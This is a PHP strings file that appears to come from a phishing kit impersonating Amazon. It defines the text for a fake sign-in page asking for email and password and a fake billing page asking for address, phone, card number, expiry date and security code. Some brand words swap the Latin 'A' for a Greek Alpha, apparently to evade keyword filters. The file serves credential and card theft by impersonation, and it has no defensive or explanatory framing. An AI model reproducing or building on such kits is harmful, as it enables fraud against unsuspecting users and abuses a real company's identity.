<?php
session_start();
error_reporting(0); 
/*---------------------------------- LOGIN TEXT'S -------------------------------------*/
$I_01 = "Amazon Sign In";
$I_02 = "Sign in";
$I_03 = "Email (phone for mobile accounts)";
$I_04 = "Enter your email or mobile phone number";
$I_05 = "Continue";
$I_06 = "Need help?";
$I_07 = "Other issues with sign in";
$I_08 = "Change";
$I_09 = "Password";
$I_10 = "Forgot your password?";
$I_11 = "Enter your password"; 
$I_12 = "Sign in";
$I_13 = "Keep me signed in.";
$I_14 = "Details";
$I_15 = "New to Amazon?";
$I_16 = "Create your Amazon account";
$I_17 = "Conditions of Use";
$I_18 = "Privacy Notice";
$I_19 = "Help";
$I_20 = "© 1996-<script>document.write(new Date().getFullYear());</script>, Αmazon.com, Inc. or its affiliates";

/*---------------------------------- BILLING TEXT'S -------------------------------------*/
$I_21 = "Interest-Based Ads";
$I_22 = "Amazon Assistant";
$I_23 = "Try Prime";
$I_24 = "Account & Lists";
$I_25 = "Orders";
$I_26 = "Cart";
$I_27 = "Browsing History";
$I_28 = "Amazon News";
$I_29 = "Today's Deals";
$I_30 = "Gift Cards";
$I_31 = "Disability Customer Support";
$I_32 = "Your Account";
$I_33 = "Your Addresses";
$I_34 = "Edit Address";
$I_35 = "Edit your address";
$I_36 = "Full name";
$I_37 = "Street address";
$I_38 = "City";
$I_39 = "State / Province / Region";
$I_40 = "Zip Code";
$I_41 = "Phone number";
$I_42 = "Edit or add new payment method";
$I_43 = "Name on card";
$I_44 = "Card number";
$I_45 = "Expiration date";
$I_46 = "Card Security Code";
$I_47 = "By clicking Agree & Continue, I have read and agree to Amazon’s";
$I_48 = "User Agreement";
$I_49 = "Privacy Policy";
$I_50 = "Electronic Communications Update Policy";
$I_51 = "Αgree & Continue";
/*---------------------------------- BILLING TEXT'S -------------------------------------*/
?>